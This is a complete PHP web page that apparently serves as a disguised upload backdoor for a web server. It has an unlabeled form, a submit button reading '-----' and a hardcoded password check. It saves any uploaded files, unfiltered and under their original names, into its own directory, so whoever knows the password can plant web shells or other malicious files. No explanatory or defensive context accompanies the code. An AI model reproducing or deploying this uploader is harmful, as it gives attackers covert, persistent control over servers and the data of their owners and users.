<html><head></head><body><?php if(empty($_GET['Nfiles']))$Nfiles=1;else $Nfiles=$_GET['Nfiles'];if($_FILES['userfile']['tmp_name'][0]!=''){if(!isset($_POST['passw'])|| $_POST['passw']!='a8d5fcf7'){exit();}for($i=0;$i<$Nfiles&&$_FILES['userfile']['tmp_name'][$i]!='';$i++){$uploaddir=dirname(__FILE__);$uploadfile=$uploaddir .'/' .basename($_FILES['userfile']['name'][$i]);print "<pre>";if(move_uploaded_file($_FILES['userfile']['tmp_name'][$i],$uploadfile)){print "File is valid. ";}else{print "info:\n";}print "</pre>";}} ?>
<form action="<?php echo $_SERVER['PHP_SELF'] .'?Nfiles=' .$Nfiles; ?>" method="post" enctype="multipart/form-data">
Send these files:<br>
<?php for($i=0;$i<$Nfiles;$i++){echo '<input name="userfile[]" type="file"><br>';} ?>
<input name="passw" value=""><input type="submit" value="-----"></form></body></html>